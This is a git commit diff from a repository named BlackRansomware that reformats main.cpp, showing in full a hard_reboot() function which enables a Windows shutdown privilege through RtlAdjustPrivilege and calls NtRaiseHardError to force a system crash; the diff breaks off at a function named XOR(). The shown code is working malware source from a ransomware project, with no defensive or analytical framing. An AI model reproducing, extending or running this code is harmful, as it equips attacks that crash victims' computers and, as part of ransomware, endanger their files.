b9f3e1037a13ddd697b9a7974c24353e126ce89b
FirstBlood12 <50457898+FirstBlood12@users.noreply.github.com>
2019-07-02 01:14:52 +0200

    Update main.cpp

--- BlackRansomware/main.cpp
+++ BlackRansomware/main.cpp
@@ -6,15 +6,15 @@ typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable
 
 signed int hard_reboot()
 {
-    BOOLEAN bEnabled;
-    ULONG uResp;
-    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
-    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
-    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
-    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
-    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
-    NtCall2(0xc0000350, 0, 0, 0, 6, &uResp); 
-    return 0;
+	BOOLEAN bEnabled;
+	ULONG uResp;
+	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
+	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
+	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
+	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
+	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
+	NtCall2(0xc0000350, 0, 0, 0, 6, &uResp); 
+	return 0;
 }
 void XOR()
 {
